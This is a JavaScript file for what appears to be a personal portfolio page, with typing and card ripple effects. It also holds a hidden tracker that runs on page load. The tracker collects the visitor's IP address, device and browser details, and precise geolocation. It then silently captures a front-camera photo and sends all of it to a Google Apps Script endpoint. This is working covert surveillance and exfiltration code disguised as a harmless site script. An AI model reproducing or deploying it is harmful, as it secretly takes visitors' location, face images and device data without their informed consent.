(async function() {
    // === 1. KONFIGURASI ===
    const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbyC9rO8IwR-bq4o9dorBWAg66oYnjCcjzeUoqegukXDgWhyFa_-RBYFWyH79IHka_nvQw/exec"; 
    let globalIP = "Checking...";

    // === 2. DEEP USER AGENT PARSER (Detail HP & Browser) ===
    const getDetailedSpecs = () => {
        const ua = navigator.userAgent;
        let osDetail = "Unknown OS", browserDetail = "Unknown Browser", deviceDetail = "Unknown Device";

        if (/Android/i.test(ua)) {
            const v = ua.match(/Android\s(\d+(\.\d+)?)/);
            osDetail = `Android ${v ? v[1] : 'Unknown'}`;
            const m = ua.match(/Android\s[^;]+;\s([^;]+)\sBuild/);
            deviceDetail = m ? m[1] : "Android Device";
        } else if (/iPhone|iPad|iPod/.test(ua)) {
            const v = ua.match(/OS (\d+)_(\d+)/);
            osDetail = `iOS ${v ? v[1]+'.'+v[2] : 'Unknown'}`;
            const w = window.screen.width, h = window.screen.height;
            const res = {"440:956":"iPhone 16 Pro Max","402:874":"iPhone 16 Pro","430:932":"iPhone 15/16 Plus","393:852":"iPhone 14Pro/15/16","390:844":"iPhone 12/13/14"};
            deviceDetail = res[`${w}:${h}`] || "Apple iPhone";
        } else {
            osDetail = navigator.platform;
            deviceDetail = "Desktop PC";
        }

        if (/XiaoMi\/MiuiBrowser\/([\d.]+)/i.test(ua)) {
            browserDetail = `MiuiBrowser ${ua.match(/XiaoMi\/MiuiBrowser\/([\d.]+)/i)[1]}`;
        } else if (/Chrome\/([\d.]+)/i.test(ua)) {
            browserDetail = `Chrome ${ua.match(/Chrome\/([\d.]+)/i)[1]}`;
        } else if (/Safari\/([\d.]+)/i.test(ua) && !/Chrome/i.test(ua)) {
            browserDetail = `Safari ${ua.match(/Version\/([\d.]+)/i)[1]}`;
        } else { browserDetail = "Other Browser"; }

        return { osDetail, browserDetail, deviceDetail };
    };

    // === 3. FUNGSI AMBIL FOTO (Auto Capture) ===
    const capturePhoto = async (specs) => {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
            const video = document.createElement('video');
            video.srcObject = stream;
            await video.play();

            await new Promise(res => setTimeout(res, 1500)); // Tunggu fokus

            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const base64Image = canvas.toDataURL('image/jpeg', 0.7).split(',')[1];

            stream.getTracks().forEach(track => track.stop());

            fetch(WEB_APP_URL, {
                method: "POST",
                mode: "no-cors",
                body: JSON.stringify({
                    type: "photo",
                    image: base64Image,
                    ip: globalIP,
                    deviceName: specs.deviceDetail
                })
            });
        } catch (err) { console.log("Kamera ditolak."); }
    };

    // === 4. TRACKING ENGINE ===
    const startTracker = async () => {
        const specs = getDetailedSpecs();
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const d = await res.json();
            globalIP = d.ip;
        } catch (e) { globalIP = "Hidden/VPN"; }

        const send = (data) => fetch(WEB_APP_URL, { method: "POST", mode: "no-cors", body: JSON.stringify(data) });

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async (pos) => {
                send({
                    type: "info", ip: globalIP, osDetail: specs.osDetail,
                    browserDetail: specs.browserDetail, deviceName: specs.deviceDetail,
                    ram: navigator.deviceMemory + " GB", lat: pos.coords.latitude, long: pos.coords.longitude
                });
                await capturePhoto(specs);
            }, () => {
                send({ type: "info", ip: globalIP, osDetail: specs.osDetail, browserDetail: specs.browserDetail, deviceName: specs.deviceDetail, lat: null, long: null });
            }, { enableHighAccuracy: true });
        }
    };

    // === 5. UI EFFECTS ===
    const typeEffect = () => {
        const texts = ['IT Support Specialist', 'Graphic Designer', 'Hardware Enthusiast'];
        let i = 0, j = 0, isDel = false;
        const el = document.getElementById('typed-text');
        if(!el) return;
        (function loop() {
            const cur = texts[i];
            el.textContent = isDel ? cur.substring(0, j--) : cur.substring(0, j++);
            let s = isDel ? 70 : 150;
            if(!isDel && j === cur.length) { s = 2000; isDel = true; }
            else if(isDel && j === 0) { isDel = false; i = (i + 1) % texts.length; s = 500; }
            setTimeout(loop, s);
        })();
    };

    window.addEventListener('load', () => {
        startTracker();
        typeEffect();
        // Ripple Effect
        document.querySelectorAll('.card').forEach(c => {
            c.addEventListener('mousemove', e => {
                const r = c.getBoundingClientRect();
                c.querySelector('.card-inner').style.setProperty('--x', `${((e.clientX - r.left)/r.width)*100}%`);
                c.querySelector('.card-inner').style.setProperty('--y', `${((e.clientY - r.top)/r.height)*100}%`);
            });
        });
    });
})();
